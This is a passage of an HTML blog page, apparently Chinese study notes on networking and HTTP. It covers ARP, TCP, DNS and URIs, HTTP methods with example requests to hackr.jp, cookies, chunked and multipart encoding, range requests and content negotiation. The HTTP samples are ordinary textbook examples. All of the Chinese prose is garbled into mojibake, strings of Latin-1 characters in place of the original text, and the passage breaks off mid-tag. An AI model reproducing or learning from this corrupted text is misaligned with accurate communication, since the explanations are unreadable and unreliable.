åœ°å€å¯å˜æ¢ï¼Œä½† MACåœ°å€åŸºæœ¬ä¸Šä¸ä¼šæ›´æ”¹ã€‚</p><h3 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h3><p>ARP æ˜¯ä¸€ç§ç”¨ä»¥è§£æåœ°å€çš„åè®®ï¼Œæ ¹æ®é€šä¿¡æ–¹çš„ IP åœ°å€å°±å¯ä»¥åæŸ¥å‡ºå¯¹åº”çš„ MAC åœ°å€ã€‚</p><h4 id="è·¯ç”±é€‰æ‹©"><a href="#è·¯ç”±é€‰æ‹©" class="headerlink" title="è·¯ç”±é€‰æ‹©"></a>è·¯ç”±é€‰æ‹©</h4><p><img src="https://z3.ax1x.com/2021/03/24/6biROK.png" alt="6biROK.png"></p><h3 id="TCPåè®®"><a href="#TCPåè®®" class="headerlink" title="TCPåè®®"></a>TCPåè®®</h3><p>TCP ä½äºä¼ è¾“å±‚ï¼Œæä¾›å¯é çš„å­—èŠ‚æµæœåŠ¡</p><h4 id="tcpä¸‰æ¬¡æ¡æ‰‹"><a href="#tcpä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="tcpä¸‰æ¬¡æ¡æ‰‹"></a>tcpä¸‰æ¬¡æ¡æ‰‹</h4><p><img src="https://z3.ax1x.com/2021/03/24/6bizkQ.png" alt="6bizkQ.png"></p><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNSï¼ˆDomain Name Systemï¼‰æœåŠ¡æ˜¯å’Œ HTTP åè®®ä¸€æ ·ä½äºåº”ç”¨å±‚çš„<br>åè®®ã€‚å®ƒæä¾›åŸŸååˆ° IP åœ°å€ä¹‹é—´çš„è§£ææœåŠ¡ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFFXV.png" alt="6bFFXV.png"></p><h3 id="å„åè®®å…³ç³»"><a href="#å„åè®®å…³ç³»" class="headerlink" title="å„åè®®å…³ç³»"></a>å„åè®®å…³ç³»</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bFE0U.png" alt="6bFE0U.png"></p><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>URI æ˜¯ Uniform Resource Identifier çš„ç¼©å†™ã€‚</p><p>URI ç”¨å­—ç¬¦ä¸²æ ‡è¯†æŸä¸€äº’è”ç½‘èµ„æºï¼Œè€Œ URLè¡¨ç¤ºèµ„æºçš„åœ°ç‚¹ï¼ˆäº’è”ç½‘ä¸Šæ‰€å¤„çš„ä½ç½®ï¼‰</p><h4 id="æ ¼å¼"><a href="#æ ¼å¼" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h4><p><img src="https://z3.ax1x.com/2021/03/24/6bFmtJ.png" alt="6bFmtJ.png"></p><p>asï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">ftp</span><span class="token punctuation">:</span><span class="token header-value">//ftp.is.co.za/rfc/rfc1808.txt</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.ietf.org/rfc/rfc2396.txt</span></span><span class="token header"><span class="token header-name keyword">ldap</span><span class="token punctuation">:</span><span class="token header-value">//[2001:db8::7]/c=GB?objectClass?one</span></span><span class="token header"><span class="token header-name keyword">mailto</span><span class="token punctuation">:</span><span class="token header-value">John.Doe@example.com</span></span><span class="token header"><span class="token header-name keyword">news</span><span class="token punctuation">:</span><span class="token header-value">comp.infosystems.www.servers.unix</span></span><span class="token header"><span class="token header-name keyword">tel</span><span class="token punctuation">:</span><span class="token header-value">+1-816-555-1212</span></span><span class="token header"><span class="token header-name keyword">telnet</span><span class="token punctuation">:</span><span class="token header-value">//192.0.2.16:80/</span></span><span class="token header"><span class="token header-name keyword">urn</span><span class="token punctuation">:</span><span class="token header-value">oasis:names:specification:docbook:dtd:xml:4.1.2</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h2><h3 id="S-Bå®¢æœç«¯ä¸æœåŠ¡å™¨ç«¯çš„äº¤äº’"><a href="#S-Bå®¢æœç«¯ä¸æœåŠ¡å™¨ç«¯çš„äº¤äº’" class="headerlink" title="S-Bå®¢æœç«¯ä¸æœåŠ¡å™¨ç«¯çš„äº¤äº’"></a>S-Bå®¢æœç«¯ä¸æœåŠ¡å™¨ç«¯çš„äº¤äº’</h3><p>åœ¨ä¸¤å°è®¡ç®—æœºä¹‹é—´ä½¿ç”¨ HTTP åè®®é€šä¿¡æ—¶ï¼Œåœ¨ä¸€æ¡é€šä¿¡çº¿è·¯ä¸Šå¿…å®šæœ‰ä¸€ç«¯æ˜¯å®¢æˆ·ç«¯ï¼Œå¦ä¸€ç«¯åˆ™æ˜¯æœåŠ¡å™¨ç«¯ã€‚</p><p>HTTP æ˜¯ä¸ä¿å­˜çŠ¶æ€çš„åè®®</p><h3 id="è¯·æ±‚-å“åº”"><a href="#è¯·æ±‚-å“åº”" class="headerlink" title="è¯·æ±‚-å“åº”"></a>è¯·æ±‚-å“åº”</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bFlX6.png" alt="6bFlX6.png"></p><p>è¯·æ±‚æŠ¥æ–‡æ˜¯ç”±è¯·æ±‚æ–¹æ³•ã€è¯·æ±‚ URIã€åè®®ç‰ˆæœ¬ã€å¯é€‰çš„è¯·æ±‚é¦–éƒ¨å­—æ®µå’Œå†…å®¹å®ä½“æ„æˆçš„ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFG7D.png" alt="6bFG7D.png"></p><p>å“åº”æŠ¥æ–‡</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFsHS.png" alt="6bFsHS.png">URIè¯·æ±‚</p><p><img src="https://z3.ax1x.com/2021/03/24/6bFR9s.png" alt="6bFR9s.png"></p><h3 id="è¯·æ±‚æ–¹æ³•"><a href="#è¯·æ±‚æ–¹æ³•" class="headerlink" title="è¯·æ±‚æ–¹æ³•"></a>è¯·æ±‚æ–¹æ³•</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>GET ï¼šè·å–èµ„æº<br>GET æ–¹æ³•ç”¨æ¥è¯·æ±‚è®¿é—®å·²è¢« URI è¯†åˆ«çš„èµ„æºã€‚æŒ‡å®šçš„èµ„æºç»æœåŠ¡å™¨ ç«¯è§£æåè¿”å›å“åº”å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¯·æ±‚çš„èµ„æºæ˜¯æ–‡æœ¬ï¼Œé‚£å°±ä¿ æŒåŸæ ·è¿”å›ï¼›å¦‚æœæ˜¯åƒ CGIï¼ˆCommon Gateway Interfaceï¼Œé€šç”¨ç½‘å…³æ¥ å£ï¼‰é‚£æ ·çš„ç¨‹åºï¼Œåˆ™è¿”å›ç»è¿‡æ‰§è¡Œåçš„è¾“å‡ºç»“æœã€‚</p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">è¿”å›  index.html çš„é¡µé¢èµ„æº<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>POSTï¼šä¼ è¾“å®ä½“ä¸»ä½“<br>POST æ–¹æ³•ç”¨æ¥ä¼ è¾“å®ä½“çš„ä¸»ä½“ã€‚<br>è™½ç„¶ç”¨ GET æ–¹æ³•ä¹Ÿå¯ä»¥ä¼ è¾“å®ä½“çš„ä¸»ä½“ï¼Œä½†ä¸€èˆ¬ä¸ç”¨ GET æ–¹æ³•è¿›è¡Œ ä¼ è¾“ï¼Œè€Œæ˜¯ç”¨ POST æ–¹æ³•ã€‚è™½è¯´ POST çš„åŠŸèƒ½ä¸ GET å¾ˆç›¸ä¼¼ï¼Œä½† POST çš„ä¸»è¦ç›®çš„å¹¶ä¸æ˜¯è·å–å“åº”çš„ä¸»ä½“å†…å®¹ã€‚</p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/submit.cgi</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1560ï¼ˆ1560å­—èŠ‚çš„æ•°æ®ï¼‰</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">è¿”å›  submit.cgi æ¥æ”¶æ•°æ®çš„å¤„ç†ç»“æœ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>PUTï¼šä¼ è¾“æ–‡ä»¶<br>PUT æ–¹æ³•ç”¨æ¥ä¼ è¾“æ–‡ä»¶ã€‚å°±åƒ FTP åè®®çš„æ–‡ä»¶ä¸Šä¼ ä¸€æ ·ï¼Œè¦æ±‚åœ¨è¯· æ±‚æŠ¥æ–‡çš„ä¸»ä½“ä¸­åŒ…å«æ–‡ä»¶å†…å®¹ï¼Œç„¶åä¿å­˜åˆ°è¯·æ±‚ URI æŒ‡å®šçš„ä½ç½®ã€‚ </p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url">/example.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html </span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1560ï¼ˆ1560 å­—èŠ‚çš„æ•°æ®</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">å“åº”è¿”å›çŠ¶æ€ç   204 No Contentï¼ˆæ¯”å¦‚  ï¼šè¯¥  html å·²å­˜åœ¨äºæœåŠ¡å™¨ä¸Šï¼‰ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>HEADï¼šè·å¾—æŠ¥æ–‡é¦–éƒ¨<br>HEAD æ–¹æ³•å’Œ  GET æ–¹æ³•ä¸€æ ·ï¼Œåªæ˜¯ä¸è¿”å›æŠ¥æ–‡ä¸»ä½“éƒ¨åˆ†ã€‚ç”¨äºç¡®è®¤ URI çš„æœ‰æ•ˆæ€§åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚</p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">HEAD</span> <span class="token request-target url">/index.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">è¿”å›index.htmlæœ‰å…³çš„å“åº”é¦–éƒ¨ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETEï¼šåˆ é™¤æ–‡ä»¶<br>DELETE æ–¹æ³•ç”¨æ¥åˆ é™¤æ–‡ä»¶ï¼Œæ˜¯ä¸ PUT ç›¸åçš„æ–¹æ³•ã€‚DELETE æ–¹æ³•æŒ‰ è¯·æ±‚ URI åˆ é™¤æŒ‡å®šçš„èµ„æºã€‚</p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">DELETE</span> <span class="token request-target url">/example.html</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">å“åº”è¿”å›çŠ¶æ€ç   204 No Contentï¼ˆæ¯”å¦‚  ï¼šè¯¥  html å·²ä»è¯¥æœåŠ¡å™¨ä¸Šåˆ é™¤ï¼‰ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>OPTIONSï¼šè¯¢é—®æ”¯æŒçš„æ–¹æ³•<br>OPTIONS æ–¹æ³•ç”¨æ¥æŸ¥è¯¢é’ˆå¯¹è¯·æ±‚ URI æŒ‡å®šçš„èµ„æºæ”¯æŒçš„æ–¹æ³•ã€‚ </p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">OPTIONS * HTTP/1.1 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span><span class="token header"><span class="token header-name keyword">Allow</span><span class="token punctuation">:</span> <span class="token header-value">GET, POST, HEAD, OPTIONS ï¼ˆè¿”å›æœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•ï¼‰ </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="TRACK"><a href="#TRACK" class="headerlink" title="TRACK"></a>TRACK</h4><p>TRACEï¼šè¿½è¸ªè·¯å¾„<br>TRACE æ–¹æ³•æ˜¯è®©  Web æœåŠ¡å™¨ç«¯å°†ä¹‹å‰çš„è¯·æ±‚é€šä¿¡ç¯å›ç»™å®¢æˆ·ç«¯çš„æ–¹ æ³•ã€‚<br>å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæœ åŠ¡å™¨ç«¯å°±å°†è¯¥æ•°å­—å‡ 1ï¼Œå½“æ•°å€¼åˆšå¥½å‡åˆ° 0 æ—¶ï¼Œå°±åœæ­¢ç»§ç»­ä¼ è¾“ï¼Œæœ€ åæ¥æ”¶åˆ°è¯·æ±‚çš„æœåŠ¡å™¨ç«¯åˆ™è¿”å›çŠ¶æ€ç  200 OK çš„å“åº”</p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">TRACE</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Max-Forwards</span><span class="token punctuation">:</span> <span class="token header-value">2 </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">message/http </span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1024 </span></span><span class="token request-line"><span class="token method property">TRACE</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp </span></span><span class="token header"><span class="token header-name keyword">Max-Forwards</span><span class="token punctuation">:</span> <span class="token header-value">2ï¼ˆè¿”å›å“åº”åŒ…å«è¯·æ±‚å†…å®¹ï¼‰ </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h4><p>CONNECTï¼šè¦æ±‚ç”¨éš§é“åè®®è¿æ¥ä»£ç†<br>CONNECT æ–¹æ³•è¦æ±‚åœ¨ä¸ä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“ï¼Œå®ç°ç”¨éš§é“å è®®è¿›è¡Œ TCP é€šä¿¡ã€‚ä¸»è¦ä½¿ç”¨ SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æ¥ å±‚ï¼‰å’Œ TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æŠŠé€šä¿¡å†…å®¹ åŠ  å¯†åç»ç½‘ç»œéš§é“ä¼ è¾“ã€‚<br>CONNECT æ–¹æ³•çš„æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºã€‚ </p><p>CONNECT ä»£ç†æœåŠ¡å™¨å:ç«¯å£å·    HTTPç‰ˆæœ¬ </p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">CONNECT proxy.hackr.jp:8080 HTTP/1.1 <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">proxy.hackr.jp </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OKï¼ˆä¹‹åè¿›å…¥ç½‘ç»œéš§é“ï¼‰ </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/03/24/6bFoHU.png" alt="6bFoHU.png"></p><h3 id="æŒä¹…è¿æ¥"><a href="#æŒä¹…è¿æ¥" class="headerlink" title="æŒä¹…è¿æ¥"></a>æŒä¹…è¿æ¥</h3><p>æŒä¹…è¿æ¥æ—¨åœ¨å»ºç«‹ 1 æ¬¡ TCP è¿æ¥åè¿›è¡Œå¤šæ¬¡è¯·æ±‚å’Œå“åº”çš„äº¤äº’</p><h4 id="ç®¡çº¿åŒ–"><a href="#ç®¡çº¿åŒ–" class="headerlink" title="ç®¡çº¿åŒ–"></a>ç®¡çº¿åŒ–</h4><p>ä¸ç­‰å¾…å“åº”ï¼Œç›´æ¥å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bFLC9.png" alt="6bFLC9.png"></p><p><img src="https://z3.ax1x.com/2021/03/24/6bkCUe.png" alt="6bkCUe.png"></p><p>è¯·æ±‚ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/image/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">hackr.jp</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">sid=1342077140226724</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å“åº”ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 12 Jul 2012 07:12:20 GMT</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Apache</span></span>ï¼œSet-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMTï¼<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain; charset=UTF-8</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="HTTPæŠ¥æ–‡"><a href="#HTTPæŠ¥æ–‡" class="headerlink" title="HTTPæŠ¥æ–‡"></a>HTTPæŠ¥æ–‡</h2><h3 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bkmb8.png" alt="6bkmb8.png"></p><p><img src="https://z3.ax1x.com/2021/03/24/6bkM5Q.png" alt="6bkM5Q.png"></p><p><img src="https://z3.ax1x.com/2021/03/24/6bk5RA.png" alt="6bk5RA.png"></p><h3 id="å‹ç¼©ä¼ è¾“"><a href="#å‹ç¼©ä¼ è¾“" class="headerlink" title="å‹ç¼©ä¼ è¾“"></a>å‹ç¼©ä¼ è¾“</h3><p>å¸¸ç”¨çš„å†…å®¹ç¼–ç æœ‰ä»¥ä¸‹å‡ ç§ï¼š<br>gzipï¼ˆGNU zipï¼‰<br>compressï¼ˆUNIX ç³»ç»Ÿçš„æ ‡å‡†å‹ç¼©ï¼‰<br>deflateï¼ˆzlibï¼‰<br>identityï¼ˆä¸è¿›è¡Œç¼–ç ï¼‰</p><h3 id="åˆ†å‰²å‘é€çš„åˆ†å—ä¼ è¾“ç¼–ç "><a href="#åˆ†å‰²å‘é€çš„åˆ†å—ä¼ è¾“ç¼–ç " class="headerlink" title="åˆ†å‰²å‘é€çš„åˆ†å—ä¼ è¾“ç¼–ç "></a>åˆ†å‰²å‘é€çš„åˆ†å—ä¼ è¾“ç¼–ç </h3><p>åˆ†å—ä¼ è¾“ç¼–ç ä¼šå°†å®ä½“ä¸»ä½“åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼ˆå—ï¼‰ã€‚æ¯ä¸€å—éƒ½ä¼šç”¨åå…­ è¿›åˆ¶æ¥æ ‡è®°å—çš„å¤§å°ï¼Œè€Œå®ä½“ä¸»ä½“çš„æœ€åä¸€å—ä¼šä½¿ç”¨â€œ0(CR+LF)â€æ¥æ ‡è®°ã€‚<br>ä½¿ç”¨åˆ†å—ä¼ è¾“ç¼–ç çš„å®ä½“ä¸»ä½“ä¼šç”±æ¥æ”¶çš„å®¢æˆ·ç«¯è´Ÿè´£è§£ç ï¼Œæ¢å¤åˆ°ç¼– ç å‰çš„å®ä½“ä¸»ä½“ã€‚</p><h3 id="å‘é€å¤šç§æ•°æ®çš„å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ"><a href="#å‘é€å¤šç§æ•°æ®çš„å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ" class="headerlink" title="å‘é€å¤šç§æ•°æ®çš„å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ"></a>å‘é€å¤šç§æ•°æ®çš„å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ</h3><ul><li><p>multipart/form-dataï¼ˆæ–‡ä»¶ä¸Šä¼ æ—¶ï¼‰</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=AaB03x</span></span>--AaB03x<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="field1"</span></span>Joe Blow--AaB03x<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="pics"; filename="file1.txt"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span><span class="token text-plain">...ï¼ˆfile1.txtçš„æ•°æ®ï¼‰...--AaB03x--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>multipart/byteranges</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">206</span> <span class="token reason-phrase string">Partial Content</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 13 Jul 2012 02:45:26 GMT</span></span><span class="token header"><span class="token header-name keyword">Last-Modified</span><span class="token punctuation">:</span> <span class="token header-value">Fri, 31 Aug 2007 02:02:20 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/byteranges; boundary=THIS_STRING_SEPARATES</span></span>--THIS_STRING_SEPARATES<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/pdf</span></span><span class="token header"><span class="token header-name keyword">Content-Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes 500-999/8000</span></span>...ï¼ˆèŒƒå›´æŒ‡å®šçš„æ•°æ®ï¼‰...--THIS_STRING_SEPARATES<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/pdf</span></span><span class="token header"><span class="token header-name keyword">Content-Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes 7000-7999/8000</span></span>...ï¼ˆèŒƒå›´æŒ‡å®šçš„æ•°æ®ï¼‰...--THIS_STRING_SEPARATES--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>ä½¿ç”¨ boundary å­—ç¬¦ä¸²æ¥åˆ’åˆ†å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆæŒ‡æ˜çš„å„ç±»å®ä½“ã€‚åœ¨boundary å­—ç¬¦ä¸²æŒ‡å®šçš„å„ä¸ªå®ä½“çš„èµ·å§‹è¡Œä¹‹å‰æ’å…¥â€œâ€“â€æ ‡è®°ï¼ˆä¾‹å¦‚ï¼šâ€“AaB03xã€â€“THIS_STRING_SEPARATESï¼‰ï¼Œè€Œåœ¨å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆå¯¹åº”çš„å­—ç¬¦ä¸²çš„æœ€åæ’å…¥â€œâ€“â€æ ‡è®°ï¼ˆä¾‹å¦‚ï¼šâ€“AaB03xâ€“ã€â€“THIS_STRING_SEPARATESâ€“ï¼‰ä½œä¸ºç»“æŸã€‚</p><h3 id="è·å–éƒ¨åˆ†å†…å®¹çš„èŒƒå›´è¯·æ±‚ï¼ˆåˆ†æ®µè¯·æ±‚ï¼‰"><a href="#è·å–éƒ¨åˆ†å†…å®¹çš„èŒƒå›´è¯·æ±‚ï¼ˆåˆ†æ®µè¯·æ±‚ï¼‰" class="headerlink" title="è·å–éƒ¨åˆ†å†…å®¹çš„èŒƒå›´è¯·æ±‚ï¼ˆåˆ†æ®µè¯·æ±‚ï¼‰"></a>è·å–éƒ¨åˆ†å†…å®¹çš„èŒƒå›´è¯·æ±‚ï¼ˆåˆ†æ®µè¯·æ±‚ï¼‰</h3><p><img src="https://z3.ax1x.com/2021/03/24/6bk0PJ.png" alt="6bk0PJ.png"></p><p>ä»ä¸€å¼€å§‹åˆ°  3000 å­—èŠ‚å’Œ  5000~7000 å­—èŠ‚ï¼Œ8000åˆ°ä¹‹åå…¨éƒ¨çš„å¤šé‡èŒƒå›´</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes=-3000, 5000-7000 ,8000-</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å†…å®¹åå•†"><a href="#å†…å®¹åå•†" class="headerlink" title="å†…å®¹åå•†"></a>å†…å®¹åå•†</h3><p>å†…å®¹åå•†æœºåˆ¶æ˜¯æŒ‡å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å°±å“åº”çš„èµ„æºå†…å®¹è¿›è¡Œäº¤æ¶‰ï¼Œç„¶ åæä¾›ç»™å®¢æˆ·ç«¯æœ€ä¸ºé€‚åˆçš„èµ„æºã€‚å†…å®¹åå•†ä¼šä»¥å“åº”èµ„æºçš„è¯­è¨€ã€å­— ç¬¦é›†ã€ç¼–ç æ–¹å¼ç­‰ä½œä¸ºåˆ¤æ–­çš„åŸºå‡†ã€‚</p><p>å‚ç…§å¤´</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">Accept Accept-CharsetAccept-Encoding Accept-Language Content-Language<span aria-hidden="true" 